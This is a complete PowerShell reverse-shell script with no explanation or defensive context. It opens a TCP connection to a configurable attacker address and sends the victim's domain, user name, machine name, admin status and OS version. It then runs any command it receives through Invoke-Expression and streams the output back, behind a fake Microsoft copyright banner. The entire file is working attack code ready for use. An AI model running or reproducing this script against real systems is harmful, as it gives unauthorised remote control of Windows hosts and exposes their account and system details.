function start-tcpClient
{
$IPAddress = '192.168.1.23';$Port = '443' # <= change this.
function base64string-encode {param($string);$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string));return $encstring}
function base64string-decode {param($encstring);$decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring));return $decstring}
function gen-key {$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();1..70 | % { $rchr += $charArray | get-random };$randkey = [string]::join("", ($rchr));return $randkey}
function get-info {
	$domain = $env:UserDomain;$LogOnServer = $env:LogOnServer;$userName = $env:UserName;$machineName = $env:ComputerName;$OS = (gwmi Win32_OperatingSystem).caption;$SysDescription = (gwmi Win32_OperatingSystem).description;$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
	$summary  = "[ System Summary ]`n"
	$summary += "Domain       : $domain`n"
	$summary += "LogOn Server : $LogOnServer`n"
	$summary += "User Name    : $userName`n"
	$summary += "ComputerName : $machineName`n"
	$summary += "Admin        : $IsAdmin`n"
	$summary += "OS version   : $OS`n"
	write-output $summary
}
function gen-enccmd {param($clrcmd);$bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString());$enccmd = [Convert]::ToBase64String($bytescmd);return $enccmd}
function dec-enccmd {param($enccmd);$cmdString = [System.Text.Encoding]::Unicode.getString([System.Convert]::Frombase64String($enccmd));return $cmdString}
function rand-str {$rint = get-random -max 10 -min 3;$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();1..$rint | % { $rchr += $charArray | get-random };$randstr = [string]::join("", ($rchr));return $randstr}
try
  {
	$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
	$stream = $client.GetStream()
	[byte[]]$bytes = 0..65535|%{0}
	$profile = ( Invoke-Expression -Command get-info 2>&1 | Out-String )
	$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell: Copyright (C) 2015 Microsoft Corporation. All rights reserved.`n" + "$profile")
	$stream.Write($sendbytes,0,$sendbytes.Length)
	$sendbytes = ([text.encoding]::ASCII).GetBytes("RSH => " + (Get-Location).Path + '> ')
	$stream.Write($sendbytes,0,$sendbytes.Length)
	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
		$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
		$data = $EncodedText.GetString($bytes,0, $i)
		try{$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )}
		catch{}
		$sendback2  = $sendback + "RSH => " + (Get-Location).Path + '> '
		$x = ($error[0] | Out-String)
		$error.clear()
		$sendback2 = $sendback2 + $x
		$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
		$stream.Write($sendbyte,0,$sendbyte.Length)
		$stream.Flush()	
	}$client.Close();if ($listener){$listener.Stop()}
  }catch{}
} start-tcpClient
